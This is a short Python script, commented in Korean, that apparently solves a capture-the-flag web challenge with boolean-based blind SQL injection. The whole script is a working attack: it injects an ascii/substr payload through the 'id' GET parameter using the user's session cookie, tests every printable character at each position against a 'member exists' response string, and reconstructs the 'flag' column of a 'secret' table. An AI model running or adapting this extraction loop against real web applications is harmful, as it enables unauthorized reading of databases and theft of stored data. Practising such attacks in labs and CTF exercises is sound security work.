# Level 1~3 payload
import requests

# 1. 대상 타겟 정보 설정
url = "http://문제url.php"
cookies = {
    'PHPSESSID': '본인 세션 키'
    # 메인 페이지 하단의 조건
    # '각 단계의 flag 는 당신 계정 전용(flag{md5})으로 발급'
}

# 2. 추출하고 싶은 MySQL 쿼리 - secret 테이블의 flag 컬럼
target_query = "SELECT flag FROM secret LIMIT 1"

flag = ""
print("[*] 블라인드 SQL 인젝션 시작...")

# 글자 위치 (1번째 글자부터 최대 40글자까지 확인)
for position in range(1, 41):
    found_char = False
    
    # ASCII 코드 32번(공백)부터 126번('~')까지 비교
    for ascii_val in range(32, 127):
        # 페이로드
        payload = f"1' and ascii(substr(({target_query}), {position}, 1)) = {ascii_val} # "
        
        # GET 파라미터 전송
        params = {'id': payload}
        
        try:
            response = requests.get(url, params=params, cookies=cookies, timeout=5)
            # print(f"[Debug] Response Snippet: {response.text[:100]}") # 응답 앞부분 100글자만 출력
            print(f"[Debug] Payload: {payload}")

            # 3. 참(True)을 판별하는 기준 단어 입력
            if "해당 ID의 회원이 존재합니다." in response.text:
                flag += chr(ascii_val)  # 숫자를 문자로 변환하여 추가
                print(f"[+] {position}번째 글자 발견! -> '{chr(ascii_val)}' (현재 플래그: {flag})")
                found_char = True
                break  # 해당 위치의 글자를 찾았으므로 다음 위치로 이동
                
        except requests.exceptions.RequestException as e:
            print(f"[-] 에러 발생: {e}")
            continue

    # ASCII 전체를 돌았는데도 문자를 못 찾았다면 플래그의 끝으로 판단하고 종료
    if not found_char:
        print("[*] 더 이상 매칭되는 문자가 없습니다. 추출을 종료합니다.")
        break

print(f"\n[★] 최종 추출된 플래그: {flag}")
